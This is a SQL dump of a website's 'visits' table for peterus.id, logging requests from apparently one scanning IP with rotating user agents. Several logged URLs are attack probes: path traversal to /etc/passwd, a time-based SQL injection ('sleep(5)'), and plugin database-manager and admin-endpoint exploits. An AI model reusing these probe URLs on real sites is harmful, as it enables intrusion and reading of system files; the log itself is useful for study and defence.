(369, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 11:18:20', '2025-06-27 11:18:20'),
(370, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15', 'https://peterus.id', '2025-06-27 11:18:22', '2025-06-27 11:18:22'),
(371, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:18:40', '2025-06-27 11:18:40'),
(372, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0', 'https://peterus.id', '2025-06-27 11:18:40', '2025-06-27 11:18:40'),
(373, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:18:57', '2025-06-27 11:18:57'),
(374, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:18:57', '2025-06-27 11:18:57'),
(375, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:20:03', '2025-06-27 11:20:03'),
(376, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 11:21:47', '2025-06-27 11:21:47'),
(377, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:21:59', '2025-06-27 11:21:59'),
(378, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 11:22:00', '2025-06-27 11:22:00'),
(379, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id', '2025-06-27 11:22:21', '2025-06-27 11:22:21'),
(380, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15', 'https://peterus.id', '2025-06-27 11:23:44', '2025-06-27 11:23:44'),
(381, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:24:02', '2025-06-27 11:24:02'),
(382, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://www.peterus.id', '2025-06-27 11:27:23', '2025-06-27 11:27:23'),
(383, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:27:48', '2025-06-27 11:27:48'),
(384, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:27:50', '2025-06-27 11:27:50'),
(385, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 11:28:44', '2025-06-27 11:28:44'),
(386, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 11:29:29', '2025-06-27 11:29:29'),
(387, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/109.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:31:02', '2025-06-27 11:31:02'),
(388, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:31:19', '2025-06-27 11:31:19'),
(389, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:31:44', '2025-06-27 11:31:44'),
(390, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-27 11:32:13', '2025-06-27 11:32:13'),
(391, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8', 'https://www.peterus.id', '2025-06-27 11:33:04', '2025-06-27 11:33:04'),
(392, '156.246.17.42', 'Mozilla/5.0  Macintosh  Intel Mac OS X 10_15_7  AppleWebKit/605.1.15  KHTML  like Gecko  Version/18.3.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 11:33:17', '2025-06-27 11:33:17'),
(393, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 11:33:35', '2025-06-27 11:33:35'),
(394, '156.246.17.42', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id', '2025-06-27 11:34:01', '2025-06-27 11:34:01'),
(395, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id', '2025-06-27 11:34:13', '2025-06-27 11:34:13'),
(396, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://peterus.id/?__kubio-site-edit-iframe-classic-template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&__kubio-site-edit-iframe-preview=1', '2025-06-27 11:34:15', '2025-06-27 11:34:15'),
(397, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 11:35:08', '2025-06-27 11:35:08'),
(398, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:35:27', '2025-06-27 11:35:27'),
(399, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://www.peterus.id', '2025-06-27 11:35:48', '2025-06-27 11:35:48'),
(400, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15', 'https://peterus.id/?instawp-database-manager=%2F..%2F..%2F..%2F.%2Fmigrate%2Ftemplates%2Fdebug%2Fdb-table&table_name=wp_users--%20-', '2025-06-27 11:35:55', '2025-06-27 11:35:55'),
(401, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id', '2025-06-27 11:36:18', '2025-06-27 11:36:18'),
(402, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/?__kubio-site-edit-iframe-classic-template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&__kubio-site-edit-iframe-preview=1', '2025-06-27 11:36:21', '2025-06-27 11:36:21'),
(403, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id/?instawp-database-manager=%2F..%2F..%2F..%2F.%2Fmigrate%2Ftemplates%2Fdebug%2Fdb-table&table_name=wp_users--%20-', '2025-06-27 11:37:15', '2025-06-27 11:37:15'),
(404, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id', '2025-06-27 11:39:47', '2025-06-27 11:39:47'),
(405, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:41:36', '2025-06-27 11:41:36'),
(406, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1', 'https://peterus.id/?UrkCEO%2Fedit=&squelette=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&style=margot.css&theme=margot', '2025-06-27 11:41:58', '2025-06-27 11:41:58'),
(407, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 11:43:27', '2025-06-27 11:43:27'),
(408, '156.246.17.42', 'Mozilla/5.0  Macintosh  Intel Mac OS X 10_15_7  AppleWebKit/605.1.15  KHTML  like Gecko  Version/18.3 Safari/605.1.15', 'https://www.peterus.id/?UrkCEO%2Fedit=&squelette=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&style=margot.css&theme=margot', '2025-06-27 11:43:30', '2025-06-27 11:43:30'),
(409, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:45:53', '2025-06-27 11:45:53'),
(410, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id', '2025-06-27 11:47:11', '2025-06-27 11:47:11'),
(411, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 'https://peterus.id/?cats=1%2Asleep%285%29&s=2z4c7tu6EkdCh7wSqX4QgW8W1PK', '2025-06-27 11:48:25', '2025-06-27 11:48:25'),
(412, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id/?cats=1%2Asleep%285%29&s=2z4c7tu6EkdCh7wSqX4QgW8W1PK', '2025-06-27 11:51:33', '2025-06-27 11:51:33'),
(413, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586', 'https://www.peterus.id', '2025-06-27 11:51:57', '2025-06-27 11:51:57'),
(414, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id/index.php?p=admin%2Factions%2Fassets%2Fgenerate-transform', '2025-06-27 11:52:47', '2025-06-27 11:52:47'),
(415, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://www.peterus.id/index.php?p=admin%2Factions%2Fassets%2Fgenerate-transform', '2025-06-27 11:55:55', '2025-06-27 11:55:55'),
(416, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:56:28', '2025-06-27 11:56:28'),
(417, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 11:57:05', '2025-06-27 11:57:05'),
(418, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 11:59:46', '2025-06-27 11:59:46'),
(419, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 12:00:00', '2025-06-27 12:00:00'),
(420, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id', '2025-06-27 12:00:07', '2025-06-27 12:00:07'),
(421, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id', '2025-06-27 12:00:37', '2025-06-27 12:00:37'),
(422, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Safari/605.1.15', 'https://peterus.id', '2025-06-27 12:09:14', '2025-06-27 12:09:14'),
(423, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 12:09:14', '2025-06-27 12:09:14'),
(424, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 12:13:13', '2025-06-27 12:13:13'),
(425, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 12:14:11', '2025-06-27 12:14:11'),
(426, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id', '2025-06-27 12:14:11', '2025-06-27 12:14:11'),
(427, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3', 'https://peterus.id', '2025-06-27 12:15:43', '2025-06-27 12:15:43'),
(428, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 12:17:53', '2025-06-27 12:17:53'),
(429, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 12:20:04', '2025-06-27 12:20:04'),
(430, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 12:20:16', '2025-06-27 12:20:16'),
(431, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-27 12:20:29', '2025-06-27 12:20:29'),
(432, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 12:43:45', '2025-06-27 12:43:45'),
(433, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'https://www.peterus.id', '2025-06-27 12:49:48', '2025-06-27 12:49:48'),
(434, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 13:15:08', '2025-06-27 13:15:08'),
(435, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 13:16:14', '2025-06-27 13:16:14'),
(436, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 13:16:14', '2025-06-27 13:16:14'),
(437, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id', '2025-06-27 13:16:14', '2025-06-27 13:16:14'),
(438, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 13:16:14', '2025-06-27 13:16:14'),
(439, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 13:22:55', '2025-06-27 13:22:55'),
(440, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.7.19', 'https://www.peterus.id', '2025-06-27 13:22:55', '2025-06-27 13:22:55'),
(441, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0', 'https://www.peterus.id', '2025-06-27 13:22:55', '2025-06-27 13:22:55'),
(442, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 13:22:58', '2025-06-27 13:22:58'),
(443, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 13:23:25', '2025-06-27 13:23:25'),
(444, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 13:28:28', '2025-06-27 13:28:28'),
(445, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586', 'https://www.peterus.id', '2025-06-27 13:37:31', '2025-06-27 13:37:31'),
(446, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/index.php', '2025-06-27 13:48:23', '2025-06-27 13:48:23'),
(447, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://peterus.id/index.php?p=dashboard&v=d', '2025-06-27 13:53:46', '2025-06-27 13:53:46'),
(448, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 'https://www.peterus.id/index.php', '2025-06-27 13:54:00', '2025-06-27 13:54:00'),
(449, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15', 'https://peterus.id/?action=login&controller=AuthController', '2025-06-27 13:57:46', '2025-06-27 13:57:46'),
(450, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?p=dashboard&v=d', '2025-06-27 14:04:04', '2025-06-27 14:04:04'),
(451, '149.57.180.183', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-27 14:04:20', '2025-06-27 14:04:20'),
(452, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 14:04:56', '2025-06-27 14:04:56'),
(453, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 14:05:13', '2025-06-27 14:05:13'),
(454, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?action=login&controller=AuthController', '2025-06-27 14:06:59', '2025-06-27 14:06:59'),
(455, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id', '2025-06-27 14:17:22', '2025-06-27 14:17:22'),
(456, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 14:17:42', '2025-06-27 14:17:42'),
(457, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id/index.php', '2025-06-27 14:33:36', '2025-06-27 14:33:36'),
(458, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/117.0 Safari/537.36', 'https://peterus.id/?%2FAdminAppData%40no-mobile-0%2F0%2F15503332983847185%2F=', '2025-06-27 14:37:31', '2025-06-27 14:37:31'),
(459, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php', '2025-06-27 14:42:06', '2025-06-27 14:42:06'),
(460, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id/?%2FAdminAppData%40no-mobile-0%2F0%2F15503332983847185%2F=', '2025-06-27 14:45:59', '2025-06-27 14:45:59'),
(461, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 14:53:27', '2025-06-27 14:53:27'),
(462, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:03:27', '2025-06-27 15:03:27'),
(463, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 15:09:13', '2025-06-27 15:09:13'),
(464, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 15:14:43', '2025-06-27 15:14:43'),
(465, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:19:15', '2025-06-27 15:19:15'),
(466, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id/?p=', '2025-06-27 15:19:59', '2025-06-27 15:19:59'),
(467, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 15:25:04', '2025-06-27 15:25:04'),
(468, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:38:22', '2025-06-27 15:38:22'),
(469, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 15:45:43', '2025-06-27 15:45:43'),
(470, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'https://www.peterus.id', '2025-06-27 15:45:57', '2025-06-27 15:45:57'),
(471, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://www.peterus.id/?p=', '2025-06-27 15:46:12', '2025-06-27 15:46:12'),
(472, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:50:04', '2025-06-27 15:50:04'),
(473, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:52:37', '2025-06-27 15:52:37'),
(474, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 15:52:38', '2025-06-27 15:52:38'),
(475, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 15:57:13', '2025-06-27 15:57:13'),
(476, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id', '2025-06-27 16:01:00', '2025-06-27 16:01:00'),
(477, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'https://peterus.id', '2025-06-27 16:07:16', '2025-06-27 16:07:16'),
(478, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 16:09:54', '2025-06-27 16:09:54'),
(479, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 16:10:32', '2025-06-27 16:10:32'),
(480, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 16:11:38', '2025-06-27 16:11:38'),
(481, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/104.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 16:12:06', '2025-06-27 16:12:06'),
(482, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id', '2025-06-27 16:12:06', '2025-06-27 16:12:06'),
(483, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id', '2025-06-27 16:12:16', '2025-06-27 16:12:16'),
(484, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 16:13:16', '2025-06-27 16:13:16');
INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
